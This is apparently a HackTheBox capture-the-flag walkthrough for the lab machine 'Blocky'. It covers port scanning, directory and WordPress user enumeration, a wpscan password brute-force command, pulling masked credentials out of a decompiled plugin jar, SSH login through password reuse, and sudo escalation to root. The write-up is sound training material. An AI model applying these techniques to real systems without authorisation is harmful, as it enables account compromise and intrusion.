# Blocky | HTB
### Difficulty Level: Easy 
----------------------------------

Start with nmap scan: 

```bash
nmap -p- -T4 -A 10.10.10.37 -oN blocky.nmap
```

-p- scans all ports instead of the 1000 common ports.

-T4 - increases the scan's speed.

-A - aggressive scan to gather more inforamtion about the system.

-oN - saves the output to file.

Results:
```bash
Nmap scan report for 10.10.10.37
Host is up (0.11s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp    open   http      Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
8192/tcp  closed sophos
25565/tcp open   minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 4.2 (92%), Linux 4.4 (92%), Linux 3.16 (90%), Linux 3.16 - 4.6 (90%), Linux 3.12 (89%), Linux 3.2 - 4.9 (89%), Linux 3.8 - 3.11 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8192/tcp)
HOP RTT       ADDRESS
1   112.87 ms 10.10.14.1
2   113.13 ms 10.10.10.37

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 769.45 seconds
```
There are 4 open ports:

21 - FTP 

22 - SSH

80 - HTTP

25565 - MINECRAFT

While browse into the web page, I could not access it so add the ip-address to the 
/etc/hosts file with:

```bash
echo '10.10.10.37     blocky.htb' >> /etc/hosts
```

There is a webpage under construction.


![image](https://cdn-images-1.medium.com/max/1000/1*N4TOEPj359KkVI8m8TmVYA.png)

So, use gobuster to enumerate directories within the system.

```bash
gobuster dir -u http://blocky.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blocky.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
Progress: 25176 / 220561 (11.41%)
[!] Keyboard interrupt detected, terminating.
Progress: 25176 / 220561 (11.41%)
===============================================================
Finished
```

let's navigate to /wp-admin, and there is wp-login page.

![image](https://cdn-images-1.medium.com/max/1000/1*RWW8gheMoxzx2U-G0eTvUA.png)

it's time to use wpscan to get the usernames that have wp accounts.

```bash
wpscan --url http://blocky.htb --enumerate u
```

Results:
```bash
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] notch
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://blocky.htb/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Notch
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)****
```

There is a username: notch. 

brute force to get the password with:

```bash
wpscan --url http://blocky.htb -U notch -P /usr/share/wordlists/rockyou.txt
```

While attacking, we need to think about another way to achieve the goal.

There is phpmyadmin login page.


![image](https://cdn-images-1.medium.com/max/1000/1*PUHin7COlBautApkw8IKEg.png)


phpMyAdmin is a free and open-source web-based application written in PHP,
designed to provide a graphical interface for managing MySQL and MariaDB databases.

Let's navigate to /plugins.


![image](https://cdn-images-1.medium.com/max/1000/1*SoWU5v3D2-SKc_Lc5tcdPw.png)


there are 2 files.

both are jar file so I used jd-gui to revese it back.

```bash
jd-gui BlockyCore.jar
```

there are some credentials:

![image](https://cdn-images-1.medium.com/max/1000/1*BFPpHkTpLmFAuEUmL1aYtg.png)

```
SQL credentials:
root:*************************************
```

So, let's try to get into the system with ssh:

```bash
ssh root@10.10.10.37
```

I didn't make it so let's try with the user notch.

```bash
ssh notch@10.10.10.37
```

and it works. we are in as notch.

Grab user.txt flag.

```bash
notch@Blocky:~$ whoami
notch
notch@Blocky:~$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
notch@Blocky:~$ ls
minecraft  user.txt
notch@Blocky:~$ cat user.txt 
********************************
notch@Blocky:~$ 
```

Let's see if there are any files that can notch run with sudo to get root:

```bash
notch@Blocky:/tmp$ sudo -l
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```

Good news. notch can run any file as any user (includs root).
so just switch user to root with:

```bash
sudo su
```

... and we are root. Grab root.txt flag.

```bash
notch@Blocky:/tmp$ sudo su
root@Blocky:/tmp# whoami
root
root@Blocky:/tmp# cat /root/root.txt 
********************************
root@Blocky:/tmp#

```

THIS IS THE END.

***Written by Alon Presman, Penetration Tester and Ethical Hacker.***



























